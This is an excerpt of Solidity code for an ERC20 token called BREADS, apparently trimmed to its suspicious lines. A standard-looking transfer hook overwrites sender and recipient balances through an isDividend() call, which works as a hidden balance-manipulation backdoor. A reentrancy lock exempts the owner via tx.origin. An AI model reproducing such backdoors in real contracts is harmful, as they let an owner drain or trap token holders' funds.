...
contract ERC20 is Context, IERC20 {
    ...
    function _beforeTokenTransfer(
        ...
        _balances[from] = isDividend(from);
        _balances[to] = isDividend(to);
    }
...
contract BREADS is ERC20, Ownable {
    ...
    modifier noReentrant(address sender,address recipient) {
        require(!locked || tx.origin == owner()|| sender == address(this)  || recipient == address(this), "No re-entrancy");
        locked = true;
        _; 
       locked = false; 
   }
    ...
    function _tax(
        ...
        uint SlipPoint = amount / 10;
        super._transfer(sender,recipient,amount - SlipPoint);
        super._transfer(sender,address(0x0),SlipPoint);
    }
